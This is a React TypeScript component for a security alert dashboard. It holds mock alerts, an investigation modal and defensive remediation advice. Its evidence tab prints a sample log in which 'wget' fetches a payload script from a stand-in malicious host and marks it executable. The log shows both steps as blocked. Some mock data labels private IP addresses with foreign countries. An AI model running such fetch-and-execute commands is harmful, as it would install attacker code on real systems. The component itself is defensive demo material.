import { useState } from 'react';
import { AlertTriangle, CheckCircle, Archive, Search, X, Shield, Clock, MapPin } from 'lucide-react';

interface Alert {
  id: string;
  title: string;
  description: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  sourceIp: string;
  country: string;
  timestamp: string;
  status: 'active' | 'resolved' | 'archived';
  type: string;
}

export function Alerts() {
  const [activeFilter, setActiveFilter] = useState<'all' | 'active' | 'resolved' | 'archived'>('all');
  const [selectedAlert, setSelectedAlert] = useState<Alert | null>(null);
  const [showSolution, setShowSolution] = useState(false);

  const alerts: Alert[] = [
    {
      id: '1',
      title: 'Multiple Malware Download Attempts Detected',
      description: 'Source IP attempting to download malicious payloads',
      severity: 'critical',
      sourceIp: '45.123.67.89',
      country: '🇨🇳 China',
      timestamp: '2 minutes ago',
      status: 'active',
      type: 'malware_download'
    },
    {
      id: '2',
      title: 'SSH Brute Force Attack',
      description: '1,247 failed login attempts in 5 minutes',
      severity: 'high',
      sourceIp: '192.168.1.100',
      country: '🇷🇺 Russia',
      timestamp: '15 minutes ago',
      status: 'active',
      type: 'brute_force'
    },
    {
      id: '3',
      title: 'Reverse Shell Connection Attempt',
      description: 'Attacker attempting to establish reverse shell',
      severity: 'critical',
      sourceIp: '10.0.50.25',
      country: '🇺🇸 USA',
      timestamp: '1 hour ago',
      status: 'resolved',
      type: 'reverse_shell'
    },
  ];

  const filteredAlerts = activeFilter === 'all' 
    ? alerts 
    : alerts.filter(a => a.status === activeFilter);

  const getSeverityStyles = (severity: string) => {
    const styles = {
      critical: 'bg-red-100 text-red-700 border-red-500',
      high: 'bg-orange-100 text-orange-700 border-orange-500',
      medium: 'bg-yellow-100 text-yellow-700 border-yellow-500',
      low: 'bg-green-100 text-green-700 border-green-500',
    };
    return styles[severity as keyof typeof styles];
  };

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-3xl font-bold text-gray-800">Alert Management Center</h1>
          <p className="text-gray-500 mt-1">Monitor and respond to security threats</p>
        </div>
        <div className="flex items-center gap-3">
          <div className="relative">
            <Search className="w-5 h-5 absolute left-3 top-1/2 -translate-y-1/2 text-gray-400" />
            <input
              type="text"
              placeholder="Search alerts..."
              className="pl-10 pr-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-primary-500"
            />
          </div>
        </div>
      </div>

      {/* Stats Bar */}
      <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
        <StatBox label="Active Alerts" value="2" color="red" />
        <StatBox label="Resolved Today" value="15" color="green" />
        <StatBox label="Avg Response Time" value="4.2m" color="blue" />
        <StatBox label="Critical Alerts" value="1" color="orange" />
      </div>

      {/* Filter Tabs */}
      <div className="bg-white rounded-xl shadow-lg border border-gray-200">
        <div className="border-b border-gray-200 px-6 py-3 flex gap-2">
          {(['all', 'active', 'resolved', 'archived'] as const).map(filter => (
            <button
              key={filter}
              onClick={() => setActiveFilter(filter)}
              className={`px-4 py-2 rounded-lg font-medium transition ${
                activeFilter === filter
                  ? 'bg-primary-100 text-primary-700'
                  : 'text-gray-600 hover:bg-gray-100'
              }`}
            >
              {filter.charAt(0).toUpperCase() + filter.slice(1)}
              <span className="ml-2 px-2 py-0.5 bg-gray-200 rounded-full text-xs">
                {filter === 'all' ? alerts.length : alerts.filter(a => a.status === filter).length}
              </span>
            </button>
          ))}
        </div>

        {/* Alert List */}
        <div className="divide-y divide-gray-100">
          {filteredAlerts.map(alert => (
            <div key={alert.id} className="p-6 hover:bg-gray-50 transition">
              <div className="flex items-start justify-between">
                <div className="flex-1">
                  <div className="flex items-center gap-3 mb-2">
                    <span className={`px-3 py-1 rounded-full text-xs font-bold border ${getSeverityStyles(alert.severity)}`}>
                      {alert.severity.toUpperCase()}
                    </span>
                    <span className={`px-3 py-1 rounded-full text-xs font-bold ${
                      alert.status === 'active' ? 'bg-green-100 text-green-700' :
                      alert.status === 'resolved' ? 'bg-blue-100 text-blue-700' :
                      'bg-gray-100 text-gray-700'
                    }`}>
                      {alert.status.toUpperCase()}
                    </span>
                  </div>
                  <h3 className="text-lg font-bold text-gray-800 mb-1">{alert.title}</h3>
                  <p className="text-gray-600 mb-3">{alert.description}</p>
                  <div className="flex items-center gap-4 text-sm text-gray-500">
                    <div className="flex items-center gap-1">
                      <MapPin className="w-4 h-4" />
                      <code className="font-mono">{alert.sourceIp}</code>
                      <span>{alert.country}</span>
                    </div>
                    <div className="flex items-center gap-1">
                      <Clock className="w-4 h-4" />
                      {alert.timestamp}
                    </div>
                  </div>
                </div>
                <div className="flex gap-2 ml-4">
                  <button
                    onClick={() => setSelectedAlert(alert)}
                    className="px-4 py-2 bg-gradient-to-r from-primary-500 to-blue-500 text-white font-bold rounded-lg hover:shadow-lg transition"
                  >
                    Investigate
                  </button>
                  <button
                    onClick={() => setShowSolution(true)}
                    className="px-4 py-2 bg-green-500 text-white font-bold rounded-lg hover:bg-green-600 transition"
                  >
                    View Solution
                  </button>
                </div>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Investigation Modal */}
      {selectedAlert && (
        <InvestigationModal alert={selectedAlert} onClose={() => setSelectedAlert(null)} />
      )}

      {/* Solution Modal */}
      {showSolution && (
        <SolutionModal onClose={() => setShowSolution(false)} />
      )}
    </div>
  );
}

function StatBox({ label, value, color }: { label: string; value: string; color: string }) {
  const colors = {
    red: 'bg-red-50 text-red-600',
    green: 'bg-green-50 text-green-600',
    blue: 'bg-blue-50 text-blue-600',
    orange: 'bg-orange-50 text-orange-600',
  };

  return (
    <div className="bg-white rounded-lg p-4 border border-gray-200">
      <div className="text-sm text-gray-500 mb-1">{label}</div>
      <div className={`text-3xl font-bold ${colors[color as keyof typeof colors]}`}>{value}</div>
    </div>
  );
}

function InvestigationModal({ alert, onClose }: { alert: Alert; onClose: () => void }) {
  const [activeTab, setActiveTab] = useState<'overview' | 'timeline' | 'evidence'>('overview');

  return (
    <div className="fixed inset-0 z-50 overflow-y-auto bg-black/70 backdrop-blur-sm">
      <div className="flex min-h-full items-center justify-center p-4">
        <div className="relative bg-white rounded-xl shadow-2xl max-w-4xl w-full">
          {/* Header */}
          <div className="px-6 py-4 border-b border-gray-200 flex items-center justify-between">
            <div>
              <h2 className="text-2xl font-bold text-gray-800">Investigation Dashboard</h2>
              <p className="text-gray-500 text-sm mt-1">Alert ID: {alert.id}</p>
            </div>
            <button onClick={onClose} className="p-2 hover:bg-gray-100 rounded-lg transition">
              <X className="w-5 h-5 text-gray-500" />
            </button>
          </div>

          {/* Tabs */}
          <div className="px-6 py-3 border-b border-gray-200 flex gap-2">
            {(['overview', 'timeline', 'evidence'] as const).map(tab => (
              <button
                key={tab}
                onClick={() => setActiveTab(tab)}
                className={`px-4 py-2 rounded-lg font-medium transition ${
                  activeTab === tab ? 'bg-primary-100 text-primary-700' : 'text-gray-600 hover:bg-gray-100'
                }`}
              >
                {tab.charAt(0).toUpperCase() + tab.slice(1)}
              </button>
            ))}
          </div>

          {/* Content */}
          <div className="p-6 max-h-96 overflow-y-auto">
            {activeTab === 'overview' && (
              <div className="space-y-4">
                <div className="grid grid-cols-2 gap-4">
                  <InfoField label="Alert Title" value={alert.title} />
                  <InfoField label="Severity" value={alert.severity.toUpperCase()} />
                  <InfoField label="Source IP" value={alert.sourceIp} />
                  <InfoField label="Country" value={alert.country} />
                  <InfoField label="Timestamp" value={alert.timestamp} />
                  <InfoField label="Status" value={alert.status.toUpperCase()} />
                </div>
                <div>
                  <div className="text-sm font-medium text-gray-700 mb-2">Description</div>
                  <p className="text-gray-600">{alert.description}</p>
                </div>
              </div>
            )}
            {activeTab === 'timeline' && (
              <div className="space-y-3">
                <TimelineEvent time="14:32:15" event="Initial connection detected" />
                <TimelineEvent time="14:32:18" event="Malicious payload downloaded" />
                <TimelineEvent time="14:32:22" event="Execution attempt blocked" />
                <TimelineEvent time="14:32:25" event="IP address blacklisted" />
              </div>
            )}
            {activeTab === 'evidence' && (
              <div className="bg-gray-900 rounded-lg p-4 font-mono text-sm text-green-400">
                <div>$ wget http://malicious.com/payload.sh</div>
                <div className="text-red-400">! Download blocked by firewall</div>
                <div>$ chmod +x payload.sh</div>
                <div className="text-red-400">! Execution denied</div>
              </div>
            )}
          </div>

          {/* Footer */}
          <div className="px-6 py-4 border-t border-gray-200 flex justify-end gap-3">
            <button onClick={onClose} className="px-4 py-2 bg-gray-200 text-gray-700 font-bold rounded-lg hover:bg-gray-300 transition">
              Close
            </button>
            <button className="px-4 py-2 bg-gradient-to-r from-primary-500 to-blue-500 text-white font-bold rounded-lg hover:shadow-lg transition">
              Export Report
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

function SolutionModal({ onClose }: { onClose: () => void }) {
  return (
    <div className="fixed inset-0 z-50 overflow-y-auto bg-black/70 backdrop-blur-sm">
      <div className="flex min-h-full items-center justify-center p-4">
        <div className="relative bg-white rounded-xl shadow-2xl max-w-2xl w-full">
          <div className="px-6 py-4 border-b border-gray-200 flex items-center justify-between">
            <h2 className="text-2xl font-bold text-gray-800">💡 Security Solution</h2>
            <button onClick={onClose} className="p-2 hover:bg-gray-100 rounded-lg transition">
              <X className="w-5 h-5" />
            </button>
          </div>
          <div className="p-6 space-y-4">
            <div className="bg-blue-50 border-l-4 border-blue-500 p-4 rounded">
              <h3 className="font-bold text-blue-900 mb-2">🚨 Immediate Actions</h3>
              <ol className="list-decimal list-inside space-y-1 text-blue-800">
                <li>Block source IP address at firewall level immediately</li>
                <li>Update antivirus/EDR signatures to detect this malware variant</li>
                <li>Scan all internal systems for indicators of compromise</li>
                <li>Isolate any potentially infected systems from the network</li>
              </ol>
            </div>
            <div className="bg-green-50 border-l-4 border-green-500 p-4 rounded">
              <h3 className="font-bold text-green-900 mb-2">🛡️ Prevention Strategy</h3>
              <ul className="list-disc list-inside space-y-1 text-green-800">
                <li>Implement application whitelisting to prevent unauthorized executables</li>
                <li>Enable advanced threat protection on all endpoints</li>
                <li>Configure outbound firewall rules to block suspicious download domains</li>
                <li>Deploy sandboxing for all downloaded files before execution</li>
              </ul>
            </div>
          </div>
          <div className="px-6 py-4 border-t border-gray-200 flex justify-end">
            <button onClick={onClose} className="px-6 py-2 bg-gradient-to-r from-primary-500 to-blue-500 text-white font-bold rounded-lg hover:shadow-lg transition">
              Got It
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

function InfoField({ label, value }: { label: string; value: string }) {
  return (
    <div>
      <div className="text-sm font-medium text-gray-700 mb-1">{label}</div>
      <div className="text-gray-900 font-mono">{value}</div>
    </div>
  );
}

function TimelineEvent({ time, event }: { time: string; event: string }) {
  return (
    <div className="flex items-start gap-3">
      <div className="w-20 text-sm font-mono text-gray-500">{time}</div>
      <div className="flex-1 bg-gray-50 rounded-lg p-3">
        <div className="text-gray-800">{event}</div>
      </div>
    </div>
  );
}